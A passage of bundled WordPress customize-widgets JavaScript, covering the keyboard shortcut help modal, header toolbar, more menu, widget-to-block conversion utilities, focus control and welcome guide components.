 * Store definition for the interface namespace.
 *
 * @see https://github.com/WordPress/gutenberg/blob/HEAD/packages/data/README.md#createReduxStore
 *
 * @type {Object}
 */
const store_store = (0,external_wp_data_namespaceObject.createReduxStore)(constants_STORE_NAME, {
  reducer: store_reducer,
  actions: store_actions_namespaceObject,
  selectors: store_selectors_namespaceObject
});

// Once we build a more generic persistence plugin that works across types of stores
// we'd be able to replace this with a register call.
(0,external_wp_data_namespaceObject.register)(store_store);

;// CONCATENATED MODULE: ./node_modules/@wordpress/interface/build-module/index.js



;// CONCATENATED MODULE: ./node_modules/@wordpress/customize-widgets/build-module/components/keyboard-shortcut-help-modal/config.js
/**
 * WordPress dependencies
 */

const textFormattingShortcuts = [{
  keyCombination: {
    modifier: 'primary',
    character: 'b'
  },
  description: (0,external_wp_i18n_namespaceObject.__)('Make the selected text bold.')
}, {
  keyCombination: {
    modifier: 'primary',
    character: 'i'
  },
  description: (0,external_wp_i18n_namespaceObject.__)('Make the selected text italic.')
}, {
  keyCombination: {
    modifier: 'primary',
    character: 'k'
  },
  description: (0,external_wp_i18n_namespaceObject.__)('Convert the selected text into a link.')
}, {
  keyCombination: {
    modifier: 'primaryShift',
    character: 'k'
  },
  description: (0,external_wp_i18n_namespaceObject.__)('Remove a link.')
}, {
  keyCombination: {
    character: '[['
  },
  description: (0,external_wp_i18n_namespaceObject.__)('Insert a link to a post or page.')
}, {
  keyCombination: {
    modifier: 'primary',
    character: 'u'
  },
  description: (0,external_wp_i18n_namespaceObject.__)('Underline the selected text.')
}, {
  keyCombination: {
    modifier: 'access',
    character: 'd'
  },
  description: (0,external_wp_i18n_namespaceObject.__)('Strikethrough the selected text.')
}, {
  keyCombination: {
    modifier: 'access',
    character: 'x'
  },
  description: (0,external_wp_i18n_namespaceObject.__)('Make the selected text inline code.')
}, {
  keyCombination: {
    modifier: 'access',
    character: '0'
  },
  description: (0,external_wp_i18n_namespaceObject.__)('Convert the current heading to a paragraph.')
}, {
  keyCombination: {
    modifier: 'access',
    character: '1-6'
  },
  description: (0,external_wp_i18n_namespaceObject.__)('Convert the current paragraph or heading to a heading of level 1 to 6.')
}];

;// CONCATENATED MODULE: ./node_modules/@wordpress/customize-widgets/build-module/components/keyboard-shortcut-help-modal/shortcut.js

/**
 * WordPress dependencies
 */


function KeyCombination({
  keyCombination,
  forceAriaLabel
}) {
  const shortcut = keyCombination.modifier ? external_wp_keycodes_namespaceObject.displayShortcutList[keyCombination.modifier](keyCombination.character) : keyCombination.character;
  const ariaLabel = keyCombination.modifier ? external_wp_keycodes_namespaceObject.shortcutAriaLabel[keyCombination.modifier](keyCombination.character) : keyCombination.character;
  return (0,external_wp_element_namespaceObject.createElement)("kbd", {
    className: "customize-widgets-keyboard-shortcut-help-modal__shortcut-key-combination",
    "aria-label": forceAriaLabel || ariaLabel
  }, (Array.isArray(shortcut) ? shortcut : [shortcut]).map((character, index) => {
    if (character === '+') {
      return (0,external_wp_element_namespaceObject.createElement)(external_wp_element_namespaceObject.Fragment, {
        key: index
      }, character);
    }
    return (0,external_wp_element_namespaceObject.createElement)("kbd", {
      key: index,
      className: "customize-widgets-keyboard-shortcut-help-modal__shortcut-key"
    }, character);
  }));
}
function Shortcut({
  description,
  keyCombination,
  aliases = [],
  ariaLabel
}) {
  return (0,external_wp_element_namespaceObject.createElement)(external_wp_element_namespaceObject.Fragment, null, (0,external_wp_element_namespaceObject.createElement)("div", {
    className: "customize-widgets-keyboard-shortcut-help-modal__shortcut-description"
  }, description), (0,external_wp_element_namespaceObject.createElement)("div", {
    className: "customize-widgets-keyboard-shortcut-help-modal__shortcut-term"
  }, (0,external_wp_element_namespaceObject.createElement)(KeyCombination, {
    keyCombination: keyCombination,
    forceAriaLabel: ariaLabel
  }), aliases.map((alias, index) => (0,external_wp_element_namespaceObject.createElement)(KeyCombination, {
    keyCombination: alias,
    forceAriaLabel: ariaLabel,
    key: index
  }))));
}
/* harmony default export */ var keyboard_shortcut_help_modal_shortcut = (Shortcut);

;// CONCATENATED MODULE: ./node_modules/@wordpress/customize-widgets/build-module/components/keyboard-shortcut-help-modal/dynamic-shortcut.js

/**
 * WordPress dependencies
 */



/**
 * Internal dependencies
 */

function DynamicShortcut({
  name
}) {
  const {
    keyCombination,
    description,
    aliases
  } = (0,external_wp_data_namespaceObject.useSelect)(select => {
    const {
      getShortcutKeyCombination,
      getShortcutDescription,
      getShortcutAliases
    } = select(external_wp_keyboardShortcuts_namespaceObject.store);
    return {
      keyCombination: getShortcutKeyCombination(name),
      aliases: getShortcutAliases(name),
      description: getShortcutDescription(name)
    };
  }, [name]);
  if (!keyCombination) {
    return null;
  }
  return (0,external_wp_element_namespaceObject.createElement)(keyboard_shortcut_help_modal_shortcut, {
    keyCombination: keyCombination,
    description: description,
    aliases: aliases
  });
}
/* harmony default export */ var dynamic_shortcut = (DynamicShortcut);

;// CONCATENATED MODULE: ./node_modules/@wordpress/customize-widgets/build-module/components/keyboard-shortcut-help-modal/index.js

/**
 * External dependencies
 */


/**
 * WordPress dependencies
 */





/**
 * Internal dependencies
 */



const ShortcutList = ({
  shortcuts
}) =>
/*
 * Disable reason: The `list` ARIA role is redundant but
 * Safari+VoiceOver won't announce the list otherwise.
 */
/* eslint-disable jsx-a11y/no-redundant-roles */
(0,external_wp_element_namespaceObject.createElement)("ul", {
  className: "customize-widgets-keyboard-shortcut-help-modal__shortcut-list",
  role: "list"
}, shortcuts.map((shortcut, index) => (0,external_wp_element_namespaceObject.createElement)("li", {
  className: "customize-widgets-keyboard-shortcut-help-modal__shortcut",
  key: index
}, typeof shortcut === 'string' ? (0,external_wp_element_namespaceObject.createElement)(dynamic_shortcut, {
  name: shortcut
}) : (0,external_wp_element_namespaceObject.createElement)(keyboard_shortcut_help_modal_shortcut, {
  ...shortcut
}))))
/* eslint-enable jsx-a11y/no-redundant-roles */;

const ShortcutSection = ({
  title,
  shortcuts,
  className
}) => (0,external_wp_element_namespaceObject.createElement)("section", {
  className: classnames_default()('customize-widgets-keyboard-shortcut-help-modal__section', className)
}, !!title && (0,external_wp_element_namespaceObject.createElement)("h2", {
  className: "customize-widgets-keyboard-shortcut-help-modal__section-title"
}, title), (0,external_wp_element_namespaceObject.createElement)(ShortcutList, {
  shortcuts: shortcuts
}));
const ShortcutCategorySection = ({
  title,
  categoryName,
  additionalShortcuts = []
}) => {
  const categoryShortcuts = (0,external_wp_data_namespaceObject.useSelect)(select => {
    return select(external_wp_keyboardShortcuts_namespaceObject.store).getCategoryShortcuts(categoryName);
  }, [categoryName]);
  return (0,external_wp_element_namespaceObject.createElement)(ShortcutSection, {
    title: title,
    shortcuts: categoryShortcuts.concat(additionalShortcuts)
  });
};
function KeyboardShortcutHelpModal({
  isModalActive,
  toggleModal
}) {
  const {
    registerShortcut
  } = (0,external_wp_data_namespaceObject.useDispatch)(external_wp_keyboardShortcuts_namespaceObject.store);
  registerShortcut({
    name: 'core/customize-widgets/keyboard-shortcuts',
    category: 'main',
    description: (0,external_wp_i18n_namespaceObject.__)('Display these keyboard shortcuts.'),
    keyCombination: {
      modifier: 'access',
      character: 'h'
    }
  });
  (0,external_wp_keyboardShortcuts_namespaceObject.useShortcut)('core/customize-widgets/keyboard-shortcuts', toggleModal);
  if (!isModalActive) {
    return null;
  }
  return (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.Modal, {
    className: "customize-widgets-keyboard-shortcut-help-modal",
    title: (0,external_wp_i18n_namespaceObject.__)('Keyboard shortcuts'),
    onRequestClose: toggleModal
  }, (0,external_wp_element_namespaceObject.createElement)(ShortcutSection, {
    className: "customize-widgets-keyboard-shortcut-help-modal__main-shortcuts",
    shortcuts: ['core/customize-widgets/keyboard-shortcuts']
  }), (0,external_wp_element_namespaceObject.createElement)(ShortcutCategorySection, {
    title: (0,external_wp_i18n_namespaceObject.__)('Global shortcuts'),
    categoryName: "global"
  }), (0,external_wp_element_namespaceObject.createElement)(ShortcutCategorySection, {
    title: (0,external_wp_i18n_namespaceObject.__)('Selection shortcuts'),
    categoryName: "selection"
  }), (0,external_wp_element_namespaceObject.createElement)(ShortcutCategorySection, {
    title: (0,external_wp_i18n_namespaceObject.__)('Block shortcuts'),
    categoryName: "block",
    additionalShortcuts: [{
      keyCombination: {
        character: '/'
      },
      description: (0,external_wp_i18n_namespaceObject.__)('Change the block type after adding a new paragraph.'),
      /* translators: The forward-slash character. e.g. '/'. */
      ariaLabel: (0,external_wp_i18n_namespaceObject.__)('Forward-slash')
    }]
  }), (0,external_wp_element_namespaceObject.createElement)(ShortcutSection, {
    title: (0,external_wp_i18n_namespaceObject.__)('Text formatting'),
    shortcuts: textFormattingShortcuts
  }));
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/customize-widgets/build-module/components/more-menu/index.js

/**
 * WordPress dependencies
 */









/**
 * Internal dependencies
 */

function MoreMenu() {
  const [isKeyboardShortcutsModalActive, setIsKeyboardShortcutsModalVisible] = (0,external_wp_element_namespaceObject.useState)(false);
  const toggleKeyboardShortcutsModal = () => setIsKeyboardShortcutsModalVisible(!isKeyboardShortcutsModalActive);
  (0,external_wp_keyboardShortcuts_namespaceObject.useShortcut)('core/customize-widgets/keyboard-shortcuts', toggleKeyboardShortcutsModal);
  return (0,external_wp_element_namespaceObject.createElement)(external_wp_element_namespaceObject.Fragment, null, (0,external_wp_element_namespaceObject.createElement)(MoreMenuDropdown, {
    as: external_wp_components_namespaceObject.ToolbarDropdownMenu
  }, () => (0,external_wp_element_namespaceObject.createElement)(external_wp_element_namespaceObject.Fragment, null, (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.MenuGroup, {
    label: (0,external_wp_i18n_namespaceObject._x)('View', 'noun')
  }, (0,external_wp_element_namespaceObject.createElement)(external_wp_preferences_namespaceObject.PreferenceToggleMenuItem, {
    scope: "core/customize-widgets",
    name: "fixedToolbar",
    label: (0,external_wp_i18n_namespaceObject.__)('Top toolbar'),
    info: (0,external_wp_i18n_namespaceObject.__)('Access all block and document tools in a single place'),
    messageActivated: (0,external_wp_i18n_namespaceObject.__)('Top toolbar activated'),
    messageDeactivated: (0,external_wp_i18n_namespaceObject.__)('Top toolbar deactivated')
  })), (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.MenuGroup, {
    label: (0,external_wp_i18n_namespaceObject.__)('Tools')
  }, (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.MenuItem, {
    onClick: () => {
      setIsKeyboardShortcutsModalVisible(true);
    },
    shortcut: external_wp_keycodes_namespaceObject.displayShortcut.access('h')
  }, (0,external_wp_i18n_namespaceObject.__)('Keyboard shortcuts')), (0,external_wp_element_namespaceObject.createElement)(external_wp_preferences_namespaceObject.PreferenceToggleMenuItem, {
    scope: "core/customize-widgets",
    name: "welcomeGuide",
    label: (0,external_wp_i18n_namespaceObject.__)('Welcome Guide')
  }), (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.MenuItem, {
    role: "menuitem",
    icon: library_external,
    href: (0,external_wp_i18n_namespaceObject.__)('https://wordpress.org/documentation/article/block-based-widgets-editor/'),
    target: "_blank",
    rel: "noopener noreferrer"
  }, (0,external_wp_i18n_namespaceObject.__)('Help'), (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.VisuallyHidden, {
    as: "span"
  }, /* translators: accessibility text */
  (0,external_wp_i18n_namespaceObject.__)('(opens in a new tab)')))), (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.MenuGroup, {
    label: (0,external_wp_i18n_namespaceObject.__)('Preferences')
  }, (0,external_wp_element_namespaceObject.createElement)(external_wp_preferences_namespaceObject.PreferenceToggleMenuItem, {
    scope: "core/customize-widgets",
    name: "keepCaretInsideBlock",
    label: (0,external_wp_i18n_namespaceObject.__)('Contain text cursor inside block'),
    info: (0,external_wp_i18n_namespaceObject.__)('Aids screen readers by stopping text caret from leaving blocks.'),
    messageActivated: (0,external_wp_i18n_namespaceObject.__)('Contain text cursor inside block activated'),
    messageDeactivated: (0,external_wp_i18n_namespaceObject.__)('Contain text cursor inside block deactivated')
  })))), (0,external_wp_element_namespaceObject.createElement)(KeyboardShortcutHelpModal, {
    isModalActive: isKeyboardShortcutsModalActive,
    toggleModal: toggleKeyboardShortcutsModal
  }));
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/customize-widgets/build-module/components/header/index.js

/**
 * External dependencies
 */


/**
 * WordPress dependencies
 */







/**
 * Internal dependencies
 */


function Header({
  sidebar,
  inserter,
  isInserterOpened,
  setIsInserterOpened,
  isFixedToolbarActive
}) {
  const [[hasUndo, hasRedo], setUndoRedo] = (0,external_wp_element_namespaceObject.useState)([sidebar.hasUndo(), sidebar.hasRedo()]);
  const shortcut = (0,external_wp_keycodes_namespaceObject.isAppleOS)() ? external_wp_keycodes_namespaceObject.displayShortcut.primaryShift('z') : external_wp_keycodes_namespaceObject.displayShortcut.primary('y');
  (0,external_wp_element_namespaceObject.useEffect)(() => {
    return sidebar.subscribeHistory(() => {
      setUndoRedo([sidebar.hasUndo(), sidebar.hasRedo()]);
    });
  }, [sidebar]);
  return (0,external_wp_element_namespaceObject.createElement)(external_wp_element_namespaceObject.Fragment, null, (0,external_wp_element_namespaceObject.createElement)("div", {
    className: classnames_default()('customize-widgets-header', {
      'is-fixed-toolbar-active': isFixedToolbarActive
    })
  }, (0,external_wp_element_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.NavigableToolbar, {
    className: "customize-widgets-header-toolbar",
    "aria-label": (0,external_wp_i18n_namespaceObject.__)('Document tools')
  }, (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.ToolbarButton, {
    icon: !(0,external_wp_i18n_namespaceObject.isRTL)() ? library_undo : library_redo
    /* translators: button label text should, if possible, be under 16 characters. */,
    label: (0,external_wp_i18n_namespaceObject.__)('Undo'),
    shortcut: external_wp_keycodes_namespaceObject.displayShortcut.primary('z')
    // If there are no undo levels we don't want to actually disable this
    // button, because it will remove focus for keyboard users.
    // See: https://github.com/WordPress/gutenberg/issues/3486
    ,
    "aria-disabled": !hasUndo,
    onClick: sidebar.undo,
    className: "customize-widgets-editor-history-button undo-button"
  }), (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.ToolbarButton, {
    icon: !(0,external_wp_i18n_namespaceObject.isRTL)() ? library_redo : library_undo
    /* translators: button label text should, if possible, be under 16 characters. */,
    label: (0,external_wp_i18n_namespaceObject.__)('Redo'),
    shortcut: shortcut
    // If there are no undo levels we don't want to actually disable this
    // button, because it will remove focus for keyboard users.
    // See: https://github.com/WordPress/gutenberg/issues/3486
    ,
    "aria-disabled": !hasRedo,
    onClick: sidebar.redo,
    className: "customize-widgets-editor-history-button redo-button"
  }), (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.ToolbarButton, {
    className: "customize-widgets-header-toolbar__inserter-toggle",
    isPressed: isInserterOpened,
    variant: "primary",
    icon: library_plus,
    label: (0,external_wp_i18n_namespaceObject._x)('Add block', 'Generic label for block inserter button'),
    onClick: () => {
      setIsInserterOpened(isOpen => !isOpen);
    }
  }), (0,external_wp_element_namespaceObject.createElement)(MoreMenu, null))), (0,external_wp_element_namespaceObject.createPortal)((0,external_wp_element_namespaceObject.createElement)(components_inserter, {
    setIsOpened: setIsInserterOpened
  }), inserter.contentContainer[0]));
}
/* harmony default export */ var header = (Header);

;// CONCATENATED MODULE: ./node_modules/@wordpress/customize-widgets/build-module/components/inserter/use-inserter.js
/**
 * WordPress dependencies
 */



/**
 * Internal dependencies
 */

function useInserter(inserter) {
  const isInserterOpened = (0,external_wp_data_namespaceObject.useSelect)(select => select(store).isInserterOpened(), []);
  const {
    setIsInserterOpened
  } = (0,external_wp_data_namespaceObject.useDispatch)(store);
  (0,external_wp_element_namespaceObject.useEffect)(() => {
    if (isInserterOpened) {
      inserter.open();
    } else {
      inserter.close();
    }
  }, [inserter, isInserterOpened]);
  return [isInserterOpened, (0,external_wp_element_namespaceObject.useCallback)(updater => {
    let isOpen = updater;
    if (typeof updater === 'function') {
      isOpen = updater((0,external_wp_data_namespaceObject.select)(store).isInserterOpened());
    }
    setIsInserterOpened(isOpen);
  }, [setIsInserterOpened])];
}

// EXTERNAL MODULE: ./node_modules/fast-deep-equal/es6/index.js
var es6 = __webpack_require__(5619);
var es6_default = /*#__PURE__*/__webpack_require__.n(es6);
;// CONCATENATED MODULE: external ["wp","isShallowEqual"]
var external_wp_isShallowEqual_namespaceObject = window["wp"]["isShallowEqual"];
var external_wp_isShallowEqual_default = /*#__PURE__*/__webpack_require__.n(external_wp_isShallowEqual_namespaceObject);
;// CONCATENATED MODULE: ./node_modules/@wordpress/customize-widgets/build-module/utils.js
// @ts-check
/**
 * WordPress dependencies
 */



/**
 * Convert settingId to widgetId.
 *
 * @param {string} settingId The setting id.
 * @return {string} The widget id.
 */
function settingIdToWidgetId(settingId) {
  const matches = settingId.match(/^widget_(.+)(?:\[(\d+)\])$/);
  if (matches) {
    const idBase = matches[1];
    const number = parseInt(matches[2], 10);
    return `${idBase}-${number}`;
  }
  return settingId;
}

/**
 * Transform a block to a customizable widget.
 *
 * @param {WPBlock} block          The block to be transformed from.
 * @param {Object}  existingWidget The widget to be extended from.
 * @return {Object} The transformed widget.
 */
function blockToWidget(block, existingWidget = null) {
  let widget;
  const isValidLegacyWidgetBlock = block.name === 'core/legacy-widget' && (block.attributes.id || block.attributes.instance);
  if (isValidLegacyWidgetBlock) {
    if (block.attributes.id) {
      // Widget that does not extend WP_Widget.
      widget = {
        id: block.attributes.id
      };
    } else {
      const {
        encoded,
        hash,
        raw,
        ...rest
      } = block.attributes.instance;

      // Widget that extends WP_Widget.
      widget = {
        idBase: block.attributes.idBase,
        instance: {
          ...existingWidget?.instance,
          // Required only for the customizer.
          is_widget_customizer_js_value: true,
          encoded_serialized_instance: encoded,
          instance_hash_key: hash,
          raw_instance: raw,
          ...rest
        }
      };
    }
  } else {
    const instance = {
      content: (0,external_wp_blocks_namespaceObject.serialize)(block)
    };
    widget = {
      idBase: 'block',
      widgetClass: 'WP_Widget_Block',
      instance: {
        raw_instance: instance
      }
    };
  }
  const {
    form,
    rendered,
    ...restExistingWidget
  } = existingWidget || {};
  return {
    ...restExistingWidget,
    ...widget
  };
}

/**
 * Transform a widget to a block.
 *
 * @param {Object} widget          The widget to be transformed from.
 * @param {string} widget.id       The widget id.
 * @param {string} widget.idBase   The id base of the widget.
 * @param {number} widget.number   The number/index of the widget.
 * @param {Object} widget.instance The instance of the widget.
 * @return {WPBlock} The transformed block.
 */
function widgetToBlock({
  id,
  idBase,
  number,
  instance
}) {
  let block;
  const {
    encoded_serialized_instance: encoded,
    instance_hash_key: hash,
    raw_instance: raw,
    ...rest
  } = instance;
  if (idBase === 'block') {
    var _raw$content;
    const parsedBlocks = (0,external_wp_blocks_namespaceObject.parse)((_raw$content = raw.content) !== null && _raw$content !== void 0 ? _raw$content : '', {
      __unstableSkipAutop: true
    });
    block = parsedBlocks.length ? parsedBlocks[0] : (0,external_wp_blocks_namespaceObject.createBlock)('core/paragraph', {});
  } else if (number) {
    // Widget that extends WP_Widget.
    block = (0,external_wp_blocks_namespaceObject.createBlock)('core/legacy-widget', {
      idBase,
      instance: {
        encoded,
        hash,
        raw,
        ...rest
      }
    });
  } else {
    // Widget that does not extend WP_Widget.
    block = (0,external_wp_blocks_namespaceObject.createBlock)('core/legacy-widget', {
      id
    });
  }
  return (0,external_wp_widgets_namespaceObject.addWidgetIdToBlock)(block, id);
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/customize-widgets/build-module/components/sidebar-block-editor/use-sidebar-block-editor.js
/**
 * External dependencies
 */


/**
 * WordPress dependencies
 */




/**
 * Internal dependencies
 */

function widgetsToBlocks(widgets) {
  return widgets.map(widget => widgetToBlock(widget));
}
function useSidebarBlockEditor(sidebar) {
  const [blocks, setBlocks] = (0,external_wp_element_namespaceObject.useState)(() => widgetsToBlocks(sidebar.getWidgets()));
  (0,external_wp_element_namespaceObject.useEffect)(() => {
    return sidebar.subscribe((prevWidgets, nextWidgets) => {
      setBlocks(prevBlocks => {
        const prevWidgetsMap = new Map(prevWidgets.map(widget => [widget.id, widget]));
        const prevBlocksMap = new Map(prevBlocks.map(block => [(0,external_wp_widgets_namespaceObject.getWidgetIdFromBlock)(block), block]));
        const nextBlocks = nextWidgets.map(nextWidget => {
          const prevWidget = prevWidgetsMap.get(nextWidget.id);

          // Bail out updates.
          if (prevWidget && prevWidget === nextWidget) {
            return prevBlocksMap.get(nextWidget.id);
          }
          return widgetToBlock(nextWidget);
        });

        // Bail out updates.
        if (external_wp_isShallowEqual_default()(prevBlocks, nextBlocks)) {
          return prevBlocks;
        }
        return nextBlocks;
      });
    });
  }, [sidebar]);
  const onChangeBlocks = (0,external_wp_element_namespaceObject.useCallback)(nextBlocks => {
    setBlocks(prevBlocks => {
      if (external_wp_isShallowEqual_default()(prevBlocks, nextBlocks)) {
        return prevBlocks;
      }
      const prevBlocksMap = new Map(prevBlocks.map(block => [(0,external_wp_widgets_namespaceObject.getWidgetIdFromBlock)(block), block]));
      const nextWidgets = nextBlocks.map(nextBlock => {
        const widgetId = (0,external_wp_widgets_namespaceObject.getWidgetIdFromBlock)(nextBlock);

        // Update existing widgets.
        if (widgetId && prevBlocksMap.has(widgetId)) {
          const prevBlock = prevBlocksMap.get(widgetId);
          const prevWidget = sidebar.getWidget(widgetId);

          // Bail out updates by returning the previous widgets.
          // Deep equality is necessary until the block editor's internals changes.
          if (es6_default()(nextBlock, prevBlock) && prevWidget) {
            return prevWidget;
          }
          return blockToWidget(nextBlock, prevWidget);
        }

        // Add a new widget.
        return blockToWidget(nextBlock);
      });

      // Bail out updates if the updated widgets are the same.
      if (external_wp_isShallowEqual_default()(sidebar.getWidgets(), nextWidgets)) {
        return prevBlocks;
      }
      const addedWidgetIds = sidebar.setWidgets(nextWidgets);
      return nextBlocks.reduce((updatedNextBlocks, nextBlock, index) => {
        const addedWidgetId = addedWidgetIds[index];
        if (addedWidgetId !== null) {
          // Only create a new instance if necessary to prevent
          // the whole editor from re-rendering on every edit.
          if (updatedNextBlocks === nextBlocks) {
            updatedNextBlocks = nextBlocks.slice();
          }
          updatedNextBlocks[index] = (0,external_wp_widgets_namespaceObject.addWidgetIdToBlock)(nextBlock, addedWidgetId);
        }
        return updatedNextBlocks;
      }, nextBlocks);
    });
  }, [sidebar]);
  return [blocks, onChangeBlocks, onChangeBlocks];
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/customize-widgets/build-module/components/focus-control/index.js

/**
 * WordPress dependencies
 */


/**
 * Internal dependencies
 */

const FocusControlContext = (0,external_wp_element_namespaceObject.createContext)();
function FocusControl({
  api,
  sidebarControls,
  children
}) {
  const [focusedWidgetIdRef, setFocusedWidgetIdRef] = (0,external_wp_element_namespaceObject.useState)({
    current: null
  });
  const focusWidget = (0,external_wp_element_namespaceObject.useCallback)(widgetId => {
    for (const sidebarControl of sidebarControls) {
      const widgets = sidebarControl.setting.get();
      if (widgets.includes(widgetId)) {
        sidebarControl.sectionInstance.expand({
          // Schedule it after the complete callback so that
          // it won't be overridden by the "Back" button focus.
          completeCallback() {
            // Create a "ref-like" object every time to ensure
            // the same widget id can also triggers the focus control.
            setFocusedWidgetIdRef({
              current: widgetId
            });
          }
        });
        break;
      }
    }
  }, [sidebarControls]);
  (0,external_wp_element_namespaceObject.useEffect)(() => {
    function handleFocus(settingId) {
      const widgetId = settingIdToWidgetId(settingId);
      focusWidget(widgetId);
    }
    let previewBound = false;
    function handleReady() {
      api.previewer.preview.bind('focus-control-for-setting', handleFocus);
      previewBound = true;
    }
    api.previewer.bind('ready', handleReady);
    return () => {
      api.previewer.unbind('ready', handleReady);
      if (previewBound) {
        api.previewer.preview.unbind('focus-control-for-setting', handleFocus);
      }
    };
  }, [api, focusWidget]);
  const context = (0,external_wp_element_namespaceObject.useMemo)(() => [focusedWidgetIdRef, focusWidget], [focusedWidgetIdRef, focusWidget]);
  return (0,external_wp_element_namespaceObject.createElement)(FocusControlContext.Provider, {
    value: context
  }, children);
}
const useFocusControl = () => (0,external_wp_element_namespaceObject.useContext)(FocusControlContext);

;// CONCATENATED MODULE: ./node_modules/@wordpress/customize-widgets/build-module/components/focus-control/use-blocks-focus-control.js
/**
 * WordPress dependencies
 */





/**
 * Internal dependencies
 */

function useBlocksFocusControl(blocks) {
  const {
    selectBlock
  } = (0,external_wp_data_namespaceObject.useDispatch)(external_wp_blockEditor_namespaceObject.store);
  const [focusedWidgetIdRef] = useFocusControl();
  const blocksRef = (0,external_wp_element_namespaceObject.useRef)(blocks);
  (0,external_wp_element_namespaceObject.useEffect)(() => {
    blocksRef.current = blocks;
  }, [blocks]);
  (0,external_wp_element_namespaceObject.useEffect)(() => {
    if (focusedWidgetIdRef.current) {
      const focusedBlock = blocksRef.current.find(block => (0,external_wp_widgets_namespaceObject.getWidgetIdFromBlock)(block) === focusedWidgetIdRef.current);
      if (focusedBlock) {
        selectBlock(focusedBlock.clientId);
        // If the block is already being selected, the DOM node won't
        // get focused again automatically.
        // We select the DOM and focus it manually here.
        const blockNode = document.querySelector(`[data-block="${focusedBlock.clientId}"]`);
        blockNode?.focus();
      }
    }
  }, [focusedWidgetIdRef, selectBlock]);
}

;// CONCATENATED MODULE: external ["wp","privateApis"]
var external_wp_privateApis_namespaceObject = window["wp"]["privateApis"];
;// CONCATENATED MODULE: ./node_modules/@wordpress/customize-widgets/build-module/lock-unlock.js
/**
 * WordPress dependencies
 */

const {
  lock,
  unlock
} = (0,external_wp_privateApis_namespaceObject.__dangerousOptInToUnstableAPIsOnlyForCoreModules)('I know using unstable features means my theme or plugin will inevitably break in the next version of WordPress.', '@wordpress/customize-widgets');

;// CONCATENATED MODULE: ./node_modules/@wordpress/customize-widgets/build-module/components/sidebar-block-editor/sidebar-editor-provider.js

/**
 * WordPress dependencies
 */


/**
 * Internal dependencies
 */



const {
  ExperimentalBlockEditorProvider
} = unlock(external_wp_blockEditor_namespaceObject.privateApis);
function SidebarEditorProvider({
  sidebar,
  settings,
  children
}) {
  const [blocks, onInput, onChange] = useSidebarBlockEditor(sidebar);
  useBlocksFocusControl(blocks);
  return (0,external_wp_element_namespaceObject.createElement)(ExperimentalBlockEditorProvider, {
    value: blocks,
    onInput: onInput,
    onChange: onChange,
    settings: settings,
    useSubRegistry: false
  }, children);
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/customize-widgets/build-module/components/welcome-guide/index.js

/**
 * WordPress dependencies
 */




function WelcomeGuide({
  sidebar
}) {
  const {
    toggle
  } = (0,external_wp_data_namespaceObject.useDispatch)(external_wp_preferences_namespaceObject.store);
  const isEntirelyBlockWidgets = sidebar.getWidgets().every(widget => widget.id.startsWith('block-'));
  return (0,external_wp_element_namespaceObject.createElement)("div", {
    className: "customize-widgets-welcome-guide"
  }, (0,external_wp_element_namespaceObject.createElement)("div", {
    className: "customize-widgets-welcome-guide__image__wrapper"
  }, (0,external_wp_element_namespaceObject.createElement)("picture", null, (0,external_wp_element_namespaceObject.createElement)("source", {
    srcSet: "https://s.w.org/images/block-editor/welcome-editor.svg",
    media: "(prefers-reduced-motion: reduce)"
  }), (0,external_wp_element_namespaceObject.createElement)("img", {
    className: "customize-widgets-welcome-guide__image",
    src: "https://s.w.org/images/block-editor/welcome-editor.gif",
    width: "312",
    height: "240",
    alt: ""
  }))), (0,external_wp_element_namespaceObject.createElement)("h1", {
    className: "customize-widgets-welcome-guide__heading"
  }, (0,external_wp_i18n_namespaceObject.__)('Welcome to block Widgets')), (0,external_wp_element_namespaceObject.createElement)("p", {
    className: "customize-widgets-welcome-guide__text"
  }, isEntirelyBlockWidgets ? (0,external_wp_i18n_namespaceObject.__)('Your theme provides different “block” areas for you to add and edit content. Try adding a search bar, social icons, or other types of blocks here and see how they’ll look on your site.') : (0,external_wp_i18n_namespaceObject.__)('You can now add any block to your site’s widget areas. Don’t worry, all of your favorite widgets still work flawlessly.')), (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.Button, {
    className: "customize-widgets-welcome-guide__button",
    variant: "primary",
    onClick: () => toggle('core/customize-widgets', 'welcomeGuide')
  }, (0,external_wp_i18n_namespaceObject.__)('Got it')), (0,external_wp_element_namespaceObject.createElement)("hr", {
    className: "customize-widgets-welcome-guide__separator"
  }), !isEntirelyBlockWidgets && (0,external_wp_element_namespaceObject.createElement)("p", {
    className: "customize-widgets-welcome-guide__more-info"
  }, (0,external_wp_i18n_namespaceObject.__)('Want to stick with the old widgets?'), (0,external_wp_element_namespaceObject.createElement)("br", null), (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.ExternalLink, {
    href: (0,external_wp_i18n_namespaceObject.__)('https://wordpress.org/plugins/classic-widgets/')
  }, (0,external_wp_i18n_namespaceObject.__)('Get the Classic Widgets plugin.'))), (0,external_wp_element_namespaceObject.createElement)("p", {
    className: "customize-widgets-welcome-guide__more-info"
  }, (0,external_wp_i18n_namespaceObject.__)('New to the block editor?'), (0,external_wp_element_namespaceObject.createElement)("br", null), (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.ExternalLink, {
    href: (0,external_wp_i18n_namespaceObject.__)('https://wordpress.org/documentation/article/wordpress-block-editor/')
  }, (0,external_wp_i18n_namespaceObject.__)("Here's a detailed guide."))));
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/customize-widgets/build-module/components/keyboard-shortcuts/index.js
/**
 * WordPress dependencies
 */







function KeyboardShortcuts({
  undo,
  redo,
  save
}) {
  const {
    replaceBlocks
  } = (0,external_wp_data_namespaceObject.useDispatch)(external_wp_blockEditor_namespaceObject.store);
  const {
